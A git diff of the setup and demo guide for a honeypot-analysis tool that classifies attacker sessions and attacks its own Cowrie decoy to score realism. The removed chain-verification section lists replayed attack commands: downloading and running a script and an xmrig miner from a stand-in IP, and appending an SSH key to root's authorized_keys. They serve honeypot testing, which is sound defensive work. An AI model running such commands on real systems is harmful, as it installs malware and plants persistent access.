@@ -1,59 +1,243 @@
-# Hivemind — Demo Flow
+# Hivemind — Setup and Demo Guide
 
-A scripted walkthrough that exercises every feature once, in an order that builds.
-**Every step below was run against the live stack**; the expected values are what it
-actually produced, not what it should produce in principle. Where something currently
-fails, this document says so rather than leaving you to discover it in front of an
-audience — see [§7](#7-what-will-fail-and-why).
+**For someone who has never seen this project before.** It assumes no prior knowledge:
+Part 1 gets it running on a fresh machine, Part 2 starts it day to day, Part 3 walks the
+demo screen by screen with what to say at each one.
 
-Budget **20–25 minutes** for the full flow, or ~8 for the short path
-([§8](#8-the-eight-minute-version)).
+Every command and every expected value here was run against the live system. Where
+something is fragile or known to fail, it says so rather than leaving you to find out in
+front of an audience.
+
+| | |
+|---|---|
+| First-time setup | 30–45 min, mostly downloads |
+| Starting up after that | ~3 min |
+| Full demo | 20–25 min |
+| Short demo | ~8 min ([Part 6](#part-6--the-eight-minute-version)) |
 
 ---
 
-## 0. Before you start
+## Part 0 — What this project is
 
-Bring everything up and confirm it, in this order. The health gate matters: a dead
-dependency produces failures that look exactly like code defects.
+Read this once before demoing; the whole walkthrough depends on it.
+
+**A honeypot is a decoy computer left exposed on a network so attackers will attack it.**
+Everything an intruder types is recorded. We run **Cowrie**, a honeypot that pretends to
+be a Linux server over SSH — an attacker logs in, gets what looks like a real shell, and
+every command is captured.
+
+Two problems follow, and **Hivemind does one thing about each**.
+
+**Problem 1: the recordings are unreadable at scale.** A honeypot produces tens of
+thousands of log lines, mostly automated bots running the same scripts. Somebody has to
+read them and say "this one is a botnet installing a crypto miner". Doing that by hand
+does not scale.
+
+> **Hivemind's first half** reconstructs each attacker session, classifies what happened
+> using a local AI model, maps the commands to **MITRE ATT&CK** (the industry-standard
+> catalogue of attacker techniques), and extracts indicators like malicious URLs.
+
+**Problem 2: an AI that guesses is worse than no AI at all.** Point a language model at
+security logs and it will produce confident, fluent, plausible claims about attacks that
+never happened. An analyst then cannot tell a recorded fact from a model's guess.
+
+> **This is the project's core idea.** Every claim on screen carries a pointer back to
+> the exact log line that produced it, and you can click it. Anything the model cannot
+> ground in real evidence is **rejected, not displayed**. Techniques matched by a
+> deterministic rule are labelled `OBSERVED`; anything the AI proposed is labelled
+> `AI INFERENCE`. The two never blur together.
+
+**Problem 3: a decoy only works if it's convincing.** If an attacker realises it's a fake
+within ten seconds, they leave and you learn nothing. Finding out *why* your honeypot is
+unconvincing normally means weeks of waiting, or paying experts to test it by hand.
+
+> **Hivemind's second half** attacks our own honeypot automatically — an SSH agent, a port
+> scan, a packet capture and scripted attack chains — and scores how convincing it is
+> across six characteristics, so the developer gets feedback in about twenty seconds.
+
+**One sentence for the audience:** *a honeypot is only worth what it can convince an
+attacker of, and this shortens the loop that makes it convincing — without ever letting
+an AI's guess get mistaken for a fact.*
+
+The project is based on the paper *"Beekeeper: Accelerating Honeypot Analysis With
+LLM-Driven Feedback"* (IEEE Access, 2025).
+
+---
+
+## Part 1 — One-time setup
+
+Do this once per machine. If someone else already set the machine up, skip to
+[Part 2](#part-2--starting-it-up).
+
+### 1.1 What you need installed
+
+| Tool | Version | Why | Check with |
+|---|---|---|---|
+| **Docker Desktop** | any current | Runs the honeypot, database and search engine | `docker --version` |
+| **Python** | 3.12 or newer | The backend | `python --version` |
+| **Node.js** | 20 or newer | The web interface | `node --version` |
+| **Ollama** | any current | Runs the AI model locally on your GPU | `ollama --version` |
+| **Git** | any | To clone the repo | `git --version` |
+| **nmap** | optional | Port-scan probe. Without it that probe reports "unknown" | `nmap --version` |
+
+**Hardware:** a GPU with **8 GB VRAM** is enough. The model is deliberately sized for it.
+Without a GPU everything still works but AI analysis takes several times longer.
+
+**Reference machine** (what this guide was verified on): Windows 11, Docker 29.7,
+Python 3.12.13, Node 24.13, nmap 7.99.
+
+> **Windows note.** Commands below show Windows paths (`.venv/Scripts/python`). On
+> Linux/macOS use `.venv/bin/python` instead. Everything else is identical.
+
+### 1.2 Get the code
+
+```bash
+git clone <your-repo-url> Hivemind
+cd Hivemind
+```
+
+### 1.3 Start the infrastructure
+
+This downloads and starts five containers: the honeypot, Elasticsearch (search engine
+holding raw events), Kibana, PostgreSQL (database holding everything derived) and
+Filebeat (ships logs from the honeypot into Elasticsearch).
 
 ```bash
 docker compose up -d
 ```
 
-Wait for `elasticsearch` and `postgres` to report `healthy`:
+First run pulls several GB — give it time. Then check everything came up:
 
 ```bash
 docker compose ps
 ```
 
-Start Ollama, confirm the model is resident on the GPU:
+**Wait until `elasticsearch` and `postgres` both say `healthy`.** The others say `Up`.
+
+Ports, all bound to `127.0.0.1` only so nothing is exposed to your network:
+
+| Port | What |
+|---|---|
+| 2222 | Honeypot SSH (the decoy attackers connect to) |
+| 2223 | Honeypot Telnet |
+| 9200 | Elasticsearch |
+| 5601 | Kibana |
+| 5432 | PostgreSQL |
+
+### 1.4 Pull the AI model
 
 ```bash
-ollama ps          # must report 100% GPU — a silent CPU fallback makes analysis ~4x slower
+ollama pull llama3.1:8b
 ```
 
-Backend — note the environment variable, it is not optional when the backend runs on the
-host (see [§7](#7-what-will-fail-and-why)):
+Then confirm it runs **on the GPU**:
+
+```bash
+ollama ps
+```
+
+You want `100% GPU`. If it says CPU, everything still works but analysis is roughly four
+times slower — and nothing warns you, so check.
+
+### 1.5 Pull the packet-capture image
+
+The demo's packet capture runs inside the honeypot's own container. Pull it now or the
+first evaluation spends a minute downloading it:
+
+```bash
+docker pull nicolaka/netshoot
+```
+
+### 1.6 Set up the backend
 
 ```bash
 cd backend
+python -m venv .venv
+.venv/Scripts/python -m pip install -e ".[dev]"      # Linux/macOS: .venv/bin/python
+cp .env.example .env                                  # optional; every value has a default
+.venv/Scripts/python -m alembic upgrade head          # creates the database tables
+```
+
+### 1.7 Set up the frontend
+
+```bash
+cd ../frontend
+npm install
+```
+
+Create a file called `.env` in the `frontend` folder containing exactly this line:
+
+```
+VITE_API_BASE_URL=http://localhost:8000
+```
+
+> **Why this matters.** Without that line the interface runs on **built-in demo data**
+> and never talks to the backend. That mode is genuinely useful (see
+> [Part 5](#part-5--demo-mode-no-backend-needed)) but it is not the live system, so if
+> you are showing real analysis, make sure this file exists.
+
+Setup is done.
+
+---
+
+## Part 2 — Starting it up
+
+Every time you demo. **You need three terminals.**
+
+### Terminal 1 — infrastructure
+
+```bash
+cd Hivemind
+docker compose up -d
+docker compose ps        # wait for elasticsearch + postgres = healthy
+```
+
+Also make sure Ollama is running (it usually starts with your machine):
+
+```bash
+ollama ps
+```
+
+### Terminal 2 — backend
+
+```bash
+cd Hivemind/backend
 EVALUATION_TARGET_HOST=127.0.0.1 .venv/Scripts/python -m uvicorn app.main:app --port 8000
 ```
 
-Frontend:
+On Windows PowerShell the environment variable goes on its own line first:
 
-```bash
-cd frontend
-npm run dev        # http://localhost:8080
+```powershell
+$env:EVALUATION_TARGET_HOST = "127.0.0.1"
+.venv\Scripts\python -m uvicorn app.main:app --port 8000
 ```
 
-**The one check worth not skipping.** Open **Settings**, or:
+> **Do not skip `EVALUATION_TARGET_HOST`.** It defaults to `cowrie`, a name that only
+> resolves *inside* Docker's network. Running the backend on your own machine, it has to
+> be `127.0.0.1` or the realism evaluation cannot reach the honeypot. See
+> [Part 7](#part-7--troubleshooting).
+
+Leave it running. First start also installs the Elasticsearch pipeline and loads a small
+set of realistic pre-recorded attacks, so every screen has data immediately.
+
+### Terminal 3 — frontend
+
+```bash
+cd Hivemind/frontend
+npm run dev
+```
+
+Open **<http://localhost:8080>**.
+
+### The one check worth not skipping
+
+Click **Settings** in the sidebar, or run:
 
 ```bash
 curl -s http://localhost:8000/api/status
 ```
 
-Expected — this is the real output:
+You should see:
 
 ```
 elasticsearch    connected      cluster status: green
@@ -63,372 +247,444 @@ evaluator        disconnected   no API key configured
 seed-corpus      running        51 seeded events
 ```
 
-`evaluator: disconnected` is **correct and expected** unless you have configured a BYOK
-key. It is not a broken demo — §5 shows what it produces, and the fact that the system
-says "unavailable" rather than inventing a number is itself a thing to demonstrate.
+> **`evaluator: disconnected` is correct and expected.** That is an *optional* cloud AI
+> model. Without it the system says "unavailable" instead of inventing a score — which is
+> itself one of the better things to demonstrate. Do not treat it as broken.
+
+If anything else is not `connected`, go to [Part 7](#part-7--troubleshooting) before
+starting the demo.
 
 ---
 
-## 1. Dashboard — the shape of the data
+## Part 3 — The demo walkthrough
 
-**Route:** `/` · **Talk to:** what the honeypot has seen.
-
-Shows KPIs, a risk distribution, a classification breakdown, an activity timeline, top
-attackers and top commands.
-
-**Point out:** panels that depend on analysis show **zero until an analysis has run**.
-They are not placeholders — an unanalysed session genuinely has no classification, and
-the dashboard refuses to invent one. You will watch these numbers move in §2.
+Ten screens in the left sidebar. Go in this order; it builds.
 
 ---
 
-## 2. Honeypots and Log Explorer — raw telemetry
+### Screen 1 · Dashboard
 
-**Routes:** `/honeypots`, `/logs`
+**Sidebar → Dashboard**
 
-`/honeypots` lists the deployed sensor (`cowrie-01`, *Cowrie SSH (med-ws-04)*) with its
-health.
+**What it is:** the fleet-level view — total events captured, sessions, risk breakdown,
+an activity timeline, top attackers and top commands.
 
-`/logs` is the raw event search. Filters map onto ECS field names — `source.ip`,
-`event.action`, `process.command_line`, `session.id` — so what you type translates
-directly into an Elasticsearch query.
+**What to say:** *"This is everything the honeypot has recorded."*
 
-**Optional live traffic.** In a second terminal:
+**Point out:** panels that depend on AI analysis show **zero** until an analysis has run.
+They are not broken and they are not placeholders — an unanalysed session genuinely has
+no classification, and the system refuses to invent one. You will watch these numbers
+move in a moment.
+
+---
+
+### Screen 2 · Honeypots
+
+**Sidebar → Honeypots**
+
+The deployed decoy: `cowrie-01`, pretending to be a Linux workstation called
+`med-ws-04`, with its health.
+
+**What to say:** *"One sensor here, but the design is fleet-shaped — everything downstream
+is scoped by which honeypot it came from."*
+
+---
+
+### Screen 3 · Log Explorer
+
+**Sidebar → Log Explorer**
+
+**What it is:** raw, unprocessed events straight from the honeypot. This is the
+"before" picture — what an analyst would otherwise have to read by hand.
+
+**What to say:** *"Thousands of lines like this is the problem the project starts from."*
+
+#### Optional: generate live traffic in front of them
+
+This is worth doing — it makes the system visibly live. In a **fourth** terminal:
 
 ```bash
-ssh -p 2222 root@127.0.0.1        # any password is accepted
+ssh -p 2222 root@127.0.0.1
 ```
 
-Type `whoami`, `uname -a`, `ls /tmp`, then `exit`. The events appear in the Log Explorer
-**within a few seconds**. This is the end-to-end ingest path — Cowrie → Filebeat →
-Elasticsearch → API → UI — running live.
+**Any password is accepted** (it is a decoy — it wants you to get in). Then type a few
+commands and leave:
+
+```
+whoami
+uname -a
+ls /tmp
+exit
+```
+
+Refresh the Log Explorer. **Your commands appear within a few seconds.** That is the full
+ingest path running live: honeypot → Filebeat → Elasticsearch → API → browser.
 
 ---
 
-## 3. Sessions and analysis — the core loop
+### Screen 4 · Attack Sessions — the core loop
 
-**Routes:** `/sessions` → `/sessions/seed-botnet-01`
+**Sidebar → Attack Sessions**
 
-The list shows 25 sessions; 7 carry three or more commands. **Use `seed-botnet-01`** —
-it is the reliable demo session, and it is rule-backed, so it produces the same result
+A session is one attacker's whole visit, rebuilt from individual events. The list shows
+about 25; seven have enough commands to be interesting.
+
+**Open `seed-botnet-01`.** Use this one — it is rule-backed, so it gives the same answer
 every time.
 
-Open it. The timeline classifies each event — connection, authentication, command,
-download, execution, disconnect — and a `tunnel` or `protocol` event is never rendered
-as an attacker command.
+You will see the risk score, session facts (attacker IP, duration, command count) and an
+**Attack Timeline** classifying each event: connection, login attempt, command, download,
+execution, disconnect.
 
-### Run the analysis
+#### Run the analysis
 
-Click **Analyze**. Expected, measured:
+**Click `AI Analyze`** (top right).
+
+Watch the **seven-stage stepper**. It advances from real progress messages sent by the
+backend over a WebSocket — it is not an animation on a timer. Each stage gets its own
+separate AI context, because the source paper found that asking for everything in one
+prompt produces noticeably shallower answers.
+
+**Takes about 25 seconds.** Expected result, measured:
 
 | | |
 |---|---|
-| Duration | **~23–28 s** |
 | Classification | **Automated botnet dropper** |
 | Risk | **critical, 90** |
-| Techniques | **3**, all `observed: true`, confidence **1.0** |
+| Techniques | **3**, all `OBSERVED`, confidence **1.0** |
 | Indicators | **5** |
-| Recommended actions | **3** |
 
-**Watch the stepper.** Seven stages advance from real WebSocket frames, not an
-animation: parse → identify patterns → classify → extract indicators → map ATT&CK →
-correlate intelligence → recommend. Each stage runs in its own model context, because
-merging them was measured to produce markedly shallower output.
+#### ★ The provenance demo — this is the centrepiece of the whole project
 
-### The provenance demo — this is the centrepiece
+Scroll to the techniques and **click one to open it**.
 
-Expand any indicator's evidence. Every claim carries an event id. For example
-`seed-botnet-01-011` resolves to the real captured event:
+You will see the technique, its confidence, and an **EVIDENCE** list. **Expand an evidence
+row.** It opens into the actual recorded event — timestamp, action, and the exact command
+the attacker typed.
 
-```
-id: seed-botnet-01-011 | action: cowrie.command.input
-command: sh malicious_script
-```
+**Say this out loud:**
 
-**Say this out loud:** nothing on this screen is asserted without a pointer back to the
-log line that produced it, and the pointer is live — it resolves through the same
-`/api/events/{id}` endpoint the Log Explorer uses.
+> *"Nothing on this screen is asserted without a pointer back to the log line that
+> produced it. And the pointer is live — this resolves through the same API the raw Log
+> Explorer uses. If the AI produces a claim it cannot ground in a real event, the claim is
+> rejected and counted, not shown."*
 
-### The negative demo — optional, and the most convincing thirty seconds
+Also point at the badges: these three techniques say **`OBSERVED`** with confidence 1.0
+because a deterministic rule matched the command. That is not the AI's opinion — the rule
+either matched or it did not. Anything the AI proposed instead would be labelled
+**`AI INFERENCE`** and rendered differently.
 
-Analyse `seed-unmapped-01`. Its commands are deliberately chosen so **no rulebook
-pattern matches**, so any technique could only come from the model.
+#### ★ Optional: the most convincing thirty seconds available
 
-On the run recorded while writing this document, the result was:
+Go back and analyse **`seed-unmapped-01`** instead. Its commands are deliberately chosen
+so **no rule matches**, meaning any technique could only come from the AI.
 
-```
-classification : Information Gathering
-risk           : medium 60
-techniques     : 0
-```
+Frequently the result is **zero techniques**. The model inferred nothing, so the system
+reported nothing — it did not invent a plausible-looking answer to fill the gap.
 
-**Zero techniques.** The local model inferred nothing, so the system reported nothing.
-It did not manufacture a plausible-looking mapping to fill the space. If the model *does*
-infer something on your run, it appears labelled **AI INFERENCE** with `observed: false`
-and a required explanation — visually distinct from the confidence-1.0 rule-backed
-mappings in `seed-botnet-01`. Either outcome makes the point; they just make it
-differently.
-
-> This session is genuinely nondeterministic — it is the same behaviour behind the one
-> known-nondeterministic test in the suite. Do not promise an audience a specific result.
+> ⚠️ **This one is genuinely random.** Sometimes the model does propose a technique, and
+> then it appears clearly marked `AI INFERENCE` with an explanation. **Either outcome
+> makes the point** — just don't promise the audience a specific result beforehand.
 
 ---
 
-## 4. Intelligence surfaces
+### Screen 5 · AI Analysis
 
-**`/mitre`** — the ATT&CK matrix. Against the pinned 21-technique catalog, **5 are
-observed** after the analyses above. Observed and inferred are rendered differently, and
-that distinction survives the whole path: rulebook → database → Elasticsearch projection
-→ this matrix.
+**Sidebar → AI Analysis**
 
-**`/threat-intel`** — 23 indicators, extracted by deterministic regex and direct field
-reads, with **no model involvement**. Three provenance tiers: an indicator's *value* is
-`OBSERVED`; an indicator seen across more than one session becomes `CORRELATED`.
-
-**Attacker profile** — open `185.220.101.44`. Shows sessions, risk, command set, and
-behavioural similarity to other attackers by Jaccard index over normalised command sets
-— deterministic and explainable rather than embedding-based, so you can say *why* two
-attackers were called similar. On this corpus it reports `0.267` against `172.19.0.1`.
-
-**Point out:** if the corpus ever exceeds the cardinality cap, similarity is reported as
-**unavailable with a reason** rather than as a confident number computed from truncated
-data.
-
-**`/reports`** — generate a report from `seed-botnet-01`. It produces
-*"Automated botnet dropper — 185.220.101.44"*. Reports are immutable JSONB snapshots:
-re-analysing the session later does **not** rewrite a report already issued.
+History of every analysis run, with model used and duration. Useful for showing this is a
+repeatable pipeline rather than a one-off.
 
 ---
 
-## 5. Realism evaluation — the second half
+### Screen 6 · MITRE ATT&CK
 
-**Route:** `/evaluation`
+**Sidebar → MITRE ATT&CK**
 
-This is where the system turns around and attacks its own honeypot.
+**What it is:** MITRE ATT&CK is the standard catalogue of attacker techniques. This matrix
+shows which ones this honeypot has actually observed, against a pinned 21-technique set.
 
-Pick `cowrie-01`, click **Run evaluation**. Expected, measured:
+**Click a highlighted technique.** Note the badge next to *Mapping confidence*: it says
+**`OBSERVED`** for rule-backed techniques and `AI INFERENCE` for model-proposed ones.
 
-- The POST returns **HTTP 202 in ~2 s** with just a run id. The run has *not* happened —
-  it is dispatched to the background.
-- The stepper advances through seven stages from real WebSocket frames.
-- The first `GET` for the run returns **404, then 200**. That is the record being
-  created, and the UI handles it explicitly rather than treating 404 as an error.
-
-### What comes back
-
-Measured on the live stack, with no BYOK key:
-
-```
-status          : completed        evaluator: unavailable      evaluatorModel: None
-agentModel      : deterministic-probes@1
-modules:
-   nmap       completed
-   agent      completed
-   chains     completed
-   tcpdump    completed
-category scores:
-   attack_possibilities   det=1.0     eval=None
-   basic_commands         det=1.0     eval=None
-   context                det=1.0     eval=None
-   file_system            det=1.0     eval=None
-   sanity                 det=0.667   eval=None
-   services               det=0.667   eval=None
-probeResults: 12   chainSteps: 7   findings: 1
-```
-
-### The finding — open this one
-
-The run produces a real, grounded finding:
-
-```
-[high] sanity (deterministic):
-   hostname_cmd and hostname_file disagree about host.name: 'med-ws-04' vs 'svr04'
-   evidence: two probe results
-```
-
-**The honeypot contradicts itself.** `hostname` answers `med-ws-04`; `cat /etc/hostname`
-answers `svr04`. Both probes establish the same canonical fact, so the contradiction is
-detected deterministically — no model involved — and the finding carries **two** evidence
-pointers, one per probe, each resolving to the recorded output that disagrees. That is a
-genuine realism defect an attacker could use to fingerprint the decoy, found automatically.
-
-### Chain verification
-
-Seven chain steps come back, each matched by a rulebook rule and each citing a real
-Cowrie event:
-
-```
-dropper         [0] wget http://198.51.100.7/malicious_script.sh   T1105      observed
-dropper         [1] chmod 777 malicious_script.sh                  T1222.002  observed
-dropper         [2] bash malicious_script.sh                       T1059.004  observed
-miner           [0] wget http://198.51.100.7/xmrig                 T1105      observed
-miner           [1] chmod 777 xmrig                                T1222.002  observed
-miner           [2] ./xmrig                                        T1496      observed
-ssh_persistence [0] echo ssh-rsa ... >> /root/.ssh/authorized_keys T1098.004  observed
-```
-
-**Click a chain step's event id.** It resolves to the real captured event — the same
-`/api/events/{id}` path the Log Explorer uses. This is the provenance demo from §3, but
-for the evaluation half: the honeypot was attacked, the attack was recognised by the same
-rulebook that classifies real intrusions, and the claim points at the log line proving it.
-
-**Four things to demonstrate here, and they are the whole point of the half:**
-
-1. **`sanity` and `services` show real fractions** — `0.667` each, two of three. Those
-   *are* verdicts. `sanity` scoring 0.667 is the honeypot's own defect, not ours: two of
-   three sanity probes agreed, one pair contradicted (see the finding below).
-2. **Every characteristic scores here, but a null is still a different thing.** If a
-   module cannot run, its facts are `unknown` and excluded from *both* the numerator and
-   the denominator — never scored as zero. To show that live, clear
-   `EVALUATION_CAPTURE_IMAGE` and re-run: `context` returns to "not established", in
-   words, because the capture could not look.
-3. **Our own failure is never counted against the honeypot.** That rule is why
-   `not_observed` and `unknown` are different values rather than both being "no".
-
-Also worth naming: **`agentModel` is `deterministic-probes@1`, not a model name.** The
-probe agent is Paramiko plus a fixed probe list — no model drives it — so naming one
-would invite a reader to attribute a run-to-run difference to a model change that never
-happened.
-
-### The evaluator
-
-`evaluator: unavailable` with **every** `evaluatorRating` null. Without a BYOK key the
-run completes and reports the gap. It **never falls back to the local model**, because
-the source paper measured sub-70b models as returning only superficial critique in this
-role — and a shallow-but-plausible realism verdict is precisely the failure this system
-exists to prevent.
-
-To demonstrate the configured path, set `BYOK_PROVIDER` / `BYOK_API_KEY` / `BYOK_MODEL`
-in `backend/.env` (see `backend/.env.example`) and restart the backend.
-
-### Compare two runs
-
-Run a **second** evaluation, then open **Compare** and select both.
-
-With nothing changed between them you get `same_configuration` and both "did not change"
-notices. The interesting demonstration is the asymmetry — say it even if you cannot
-trigger it live:
-
-- a changed **honeypot** fingerprint is reported as a *positive*: that change is the
-  improvement being measured, and the deltas are its effect;
-- a changed **evaluation configuration** fingerprint is a *warning*: our own probes,
-  chains, rulebook or budget moved, so the delta is not attributable to the honeypot.
-
-The comparison is never refused — it states plainly whether a delta can be attributed.
-
-Deltas are shown in **percentage points** (`+11 pp`), deliberately a different unit from
-the scores themselves, so a delta can never be misread as a score.
+**What to say:** *"That distinction survives the entire path — from the rule that matched,
+through the database, back into the search index, and onto this screen. An AI guess never
+gets promoted into a recorded fact."*
 
 ---
 
-## 6. Demo mode — no backend at all
+### Screen 7 · Threat Intelligence
 
-Useful as a fallback if the stack misbehaves in front of an audience, and it exercises
-the null paths deterministically.
+**Sidebar → Threat Intelligence**
+
+Indicators pulled out of the sessions — malicious IPs, URLs, file hashes, usernames.
+
+**Two things to point out:**
+
+- Extraction is **pure pattern matching, no AI involved at all.** These are facts read
+  directly out of the telemetry.
+- Each carries a provenance tier. An indicator seen in more than one session is marked
+  `CORRELATED` — derived by connecting sessions, which is a different kind of claim from a
+  directly observed one.
+
+**Attacker profiles:** open an attacker (e.g. `185.220.101.44`). It shows their sessions,
+commands, and **behavioural similarity** to other attackers — computed by comparing command
+sets, not by an AI embedding, so you can always explain *why* two attackers were called
+similar.
+
+---
+
+### Screen 8 · Reports
+
+**Sidebar → Reports**
+
+Generate a report from `seed-botnet-01` — it produces *"Automated botnet dropper —
+185.220.101.44"*.
+
+**Point out:** reports are **immutable snapshots**. Re-analysing that session later does
+not rewrite a report you already issued.
+
+---
+
+### Screen 9 · Realism Evaluation — the second half ★
+
+**Sidebar → Realism Evaluation**
+
+**What it is — explain before clicking:**
+
+> *"Everything so far analysed attacks that came in. This does the opposite: it attacks
+> our own honeypot, to measure how convincing it would look to a real intruder."*
+
+Pick **`Cowrie SSH (med-ws-04)`** from the dropdown and click **Run evaluation**.
+
+#### What happens
+
+The button flips to "Evaluation in flight" **immediately** and you get a run id. The work
+happens in the background — the seven stages stream in live. **Takes about 20 seconds.**
+
+Behind those stages: it clears leftovers from the last run, fingerprints the honeypot,
+port-scans it, starts a packet capture, logs in over SSH and runs a set of probes, then
+replays three known attack chains (downloading malware, installing a crypto miner,
+planting an SSH backdoor).
+
+#### The result — four things to show, in this order
+
+Open the finished run.
+
+**1. Two separate scores, never combined.**
+
+Every characteristic has a **Deterministic assessment** ("did the honeypot do the
+checkable things?") and an **Evaluator assessment** ("would an attacker believe it?").
+
+> *"There is deliberately no single overall score. One is a measurement, the other is a
+> judgement — averaging them produces a number that means neither."*
+
+Expected, measured:
+
+```
+attack_possibilities  100%     file_system  100%
+basic_commands        100%     sanity        67%
+context               100%     services      67%
+```
+
+The Evaluator column reads **"unavailable — no cloud model configured"** throughout, and
+the header states it plainly: **"Absent is not zero."**
+
+**2. The honeypot contradicts itself — a real defect, found automatically.**
+
+Scroll to **Findings**. There is one, severity HIGH:
+
+```
+hostname_cmd and hostname_file disagree about host.name: 'med-ws-04' vs 'svr04'
+```
+
+The `hostname` command says one thing; the `/etc/hostname` file says another. **A real
+intruder would notice that immediately.** Expand the evidence — both probe results are
+there, showing the two disagreeing values.
+
+> *"No AI was involved in finding that. Two probes established the same fact and
+> disagreed, and that contradiction is detected deterministically."*
+
+**3. The attack chains were recognised.**
+
+Scroll to **Chain steps**. Seven steps, each showing: the command run, the ATT&CK
+technique expected, the rule that matched, and a **Cowrie event id**.
+
+**Click an event id.** It expands into the real captured event.
+
+> *"This is the same provenance idea as the first half, running in the other direction. We
+> attacked the honeypot, the attack was recognised by the same rulebook that classifies
+> real intrusions, and the claim points at the log line proving it happened."*
+
+**4. `sanity` and `services` scored 67%, not 100%.**
+
+Those are *real* verdicts — two out of three each. The honeypot genuinely has gaps. That
+is the entire point: the developer now has something specific to fix.
+
+#### Comparing two runs
+
+Run a **second** evaluation, then click **Compare runs** and pick both.
+
+Each run records two fingerprints — one for the honeypot, one for the test setup — and the
+comparison treats them **differently on purpose**:
+
+- **The honeypot changed** → shown as *positive*. That change is the improvement being
+  measured.
+- **The test configuration changed** → shown as a *warning*. Our own probes moved, so any
+  difference can no longer be blamed on the honeypot.
+
+With two identical runs you get both "did not change" notices and deltas of `±0 pp`.
+
+**Want to show the "not established" case?** Stop the backend, restart it with
+`EVALUATION_CAPTURE_IMAGE=` (empty), and run again — the packet capture can no longer look,
+so `context` reports *"not established"* in words instead of a number. That is the
+tri-state doing its job: "we could not measure" is not "the honeypot failed".
+
+---
+
+### Screen 10 · Settings
+
+**Sidebar → Settings**
+
+Live health of every dependency, plus the security boundaries: no infrastructure
+credentials ever reach the browser, and the AI model in use is read from the backend
+rather than hardcoded.
+
+---
+
+## Part 4 — The single most important point
+
+If the audience remembers one thing, make it this:
+
+> **Fewer claims reach the screen than an ungrounded system would produce — and that is
+> the design working, not a limitation.** Every claim opens into the exact log line behind
+> it. A model's guess is labelled as a guess. And where the system could not measure
+> something, it says *"not established"* rather than showing you a zero — because a zero
+> looks like a verdict, and "we couldn't check" is not a verdict.
+
+---
+
+## Part 5 — Demo mode (no backend needed)
+
+A **fallback if the stack misbehaves**, and useful on a laptop with nothing installed.
 
 ```bash
 cd frontend
-mv .env .env.bak        # or just unset VITE_API_BASE_URL
+# Windows:      ren .env .env.bak
+# Linux/macOS:  mv .env .env.bak
 npm run dev
 ```
 
-Every surface renders from a labelled demo dataset. Three fixtures exist specifically to
-exercise states that are hard to trigger live:
+Every screen renders from a clearly-labelled built-in dataset. It also contains three
+cases that are hard to produce live:
 
-| Fixture | Demonstrates |
+| Fixture | Shows |
 |---|---|
-| `evaluationRunB` | evaluator `unavailable`, every rating null — nothing renders as `0.0` |
-| `evaluationRunC` | `status: failed` while **every module is `completed`** — *our* orchestration failed, not the honeypot |
-| `evaluationRunA` | a null `deterministicScore` **and** an entirely absent characteristic — "not established" and "not measured" are different things |
+| Run B | Evaluator unavailable, every rating null — nothing renders as `0.0` |
+| Run C | Status `failed` while every module `completed` — *our* orchestration failed, not the honeypot |
+| Run A | A null score **and** an entirely missing characteristic — "not established" and "not measured" are different things |
 
-Restore with `mv .env.bak .env`.
+Restore afterwards: `ren .env.bak .env` (or `mv`).
 
 ---
 
-## 7. What will fail, and why
+## Part 6 — The eight-minute version
 
-Be upfront about these rather than being surprised.
+If you are short on time:
 
-### `EVALUATION_TARGET_HOST` defaults to `cowrie`
+1. **Settings** — everything connected.
+2. **Attack Sessions → `seed-botnet-01` → AI Analyze** — watch the seven stages (~25 s).
+3. **Expand a piece of evidence** → the real log line. ★ *This is the project's whole thesis.*
+4. **MITRE ATT&CK** — `OBSERVED` vs `AI INFERENCE`, rendered differently.
+5. **Realism Evaluation → Run evaluation** (~20 s) — two separate scores, no overall score.
+6. **Open the sanity finding** — the honeypot disagrees with itself about its own hostname.
+7. **Expand a chain step's event id** — it resolves to the real captured command.
 
-That is the compose service name and does **not** resolve from a backend running on the
-host — you get `getaddrinfo failed` and even nmap reports nothing. Start the backend with
-`EVALUATION_TARGET_HOST=127.0.0.1` as §0 shows.
+---
 
-This one is worth knowing for a second reason. The honeypot is reached through a
-*published container port*, so Docker re-originates the connection and Cowrie records the
-proxy's source port, not ours — we open from one port and Cowrie logs another. Chain
-verification therefore scopes its read-back on Cowrie's own `session.id`, discovered via a
-per-session nonce the agent writes, rather than on the port. If you see chains time out
-with "commands were not indexed", that correlation is where to look.
+## Part 7 — Troubleshooting
 
-### The packet capture needs its image pulled
+### "getaddrinfo failed" / the evaluation cannot reach the honeypot
 
-The capture runs inside the honeypot container's network namespace, from
-`nicolaka/netshoot`. Pull it once before the demo or the first run spends a minute
-fetching it:
+You started the backend without `EVALUATION_TARGET_HOST=127.0.0.1`. The default (`cowrie`)
+is a name that only exists inside Docker's network. Stop the backend and restart it as
+shown in [Part 2](#terminal-2--backend).
+
+### Elasticsearch or Postgres not `healthy`
+
+Give them another minute — Elasticsearch is slow to start. If they stay down:
 
 ```bash
-docker pull nicolaka/netshoot
+docker compose down
+docker compose up -d
 ```
 
-Capturing anywhere else does not work for a containerised honeypot, and the failure is
-silent rather than loud: measured here, a WSL distro counted **0 packets** for the same
-SSH session the container's own namespace counted **30**. Zero would be reported as
-`not_observed` — "no traffic occurred" — which is a false claim rather than an absent one.
+### Docker Desktop won't start / "cannot find the pipe"
 
-### `nmap` is optional too
+Start Docker Desktop from the Start menu and wait for the whale icon to stop animating.
+`docker info` succeeding is the real signal. This can take a couple of minutes.
 
-Without it the service-scan probe reports `unknown` for every expected service, rather
-than `not_observed`. Our inability to look is not evidence against the honeypot.
+### The honeypot's ports are refused (2222 / 2223)
 
-### One test is genuinely nondeterministic
+On Windows these sometimes fall inside a reserved port range after a reboot. Check:
 
-`test_intel.py::test_coverage_marks_llm_inferred_technique_as_not_observed` passes or
-fails depending on whether `llama3.1:8b` happens to infer a technique on that pass. A
-suite run showing **exactly this one failure** is a clean run.
+```powershell
+netsh int ipv4 show excludedportrange protocol=tcp
+```
+
+If `2222` falls inside a listed range, release it (elevated PowerShell):
+
+```powershell
+net stop winnat
+net start winnat
+```
+
+Then `docker compose up -d` again.
+
+### Analysis is very slow
+
+`ollama ps` is probably showing CPU rather than `100% GPU`. It still works, just slowly.
+
+### The evaluation's packet capture fails
+
+Pull the image: `docker pull nicolaka/netshoot`. The capture runs inside the honeypot's
+container network, which is the only place it can actually see the honeypot's traffic.
+
+### Interface shows data but nothing updates / analysis does nothing
+
+`frontend/.env` is probably missing, so the app is in demo mode. It must contain
+`VITE_API_BASE_URL=http://localhost:8000`. Restart `npm run dev` after creating it.
+
+### One test fails when I run the test suite
+
+`test_intel.py::test_coverage_marks_llm_inferred_technique_as_not_observed` depends on
